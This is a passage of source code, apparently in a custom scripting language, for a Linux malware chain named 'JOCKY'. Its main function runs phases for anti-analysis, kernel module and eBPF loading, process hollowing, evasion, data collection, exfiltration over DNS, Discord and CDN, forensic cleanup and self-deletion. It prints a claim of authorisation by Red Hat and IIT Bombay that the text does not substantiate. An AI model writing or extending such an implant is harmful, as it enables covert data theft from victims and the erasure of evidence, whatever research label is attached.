    log_op("forensics", "cleanup", "all_linux_artifacts", "wiped")
    println("")
}

fn phase_self_delete() {
    println("[*] Scheduling self-deletion...")
    jocky_self_delete()
    println("  [+] Binary will be unlinked on exit")
    log_op("forensics", "self_delete", "binary", "scheduled")
    println("")
}

fn phase_audit_export() {
    println("[*] Exporting audit trail...")
    audit_export("/tmp/research_audit.bin")

    let valid = audit_verify()
    if valid == 0 {
        println("  [+] Audit chain integrity verified")
        println("  [+] Exported: /tmp/research_audit.bin")
    } else {
        println("  [!] Audit chain integrity FAILED")
    }
    println("")
}

fn print_summary() {
    println("================================================================")
    println("JOCKY Linux Research Chain - Complete")
    println("================================================================")
    println("")
    println("  Operations:    " + string(operations_count))
    println("  LKM Loaded:    " + string(modules_loaded))
    println("  eBPF Attached: " + string(ebpf_loaded))
    println("  Threat Score:  " + string(threat_score))
    println("  Audit Trail:   /tmp/research_audit.bin")
    println("  Sandbox Trace: /tmp/collector_trace.bin")
    println("")
    println("Capabilities:")
    println("  [+] Kernel module loading (LKM)")
    println("  [+] eBPF program attachment")
    println("  [+] Process hollowing")
    println("  [+] ML threat-driven strategy selection")
    println("  [+] Multi-channel exfiltration (DNS, Discord, CDN)")
    println("  [+] Full Linux forensic cleanup")
    println("  [+] Self-deletion")
    println("")
    println("Authorization: Red Hat + IIT Bombay Cyber Security Team")
    println("================================================================")
}

fn main() {
    println("")
    println("================================================================")
    println("JOCKY Linux Research Chain")
    println("LKM + eBPF + Process Hollowing + Exfiltration")
    println("Authorized: Red Hat + IIT Bombay Cyber Security Team")
    println("================================================================")
    println("")

    phase_init()
    phase_anti_analysis()
    phase_lkm_loading()
    phase_ebpf_loading()
    phase_process_hollowing()
    phase_threat_assessment()
    phase_evasion_strategy()
    phase_plugins()
    phase_sandbox_collector()
    let chunks = phase_data_collection()
    phase_exfiltration()
    phase_forensic_cleanup()
    phase_self_delete()
    phase_audit_export()
    print_summary()
}`;
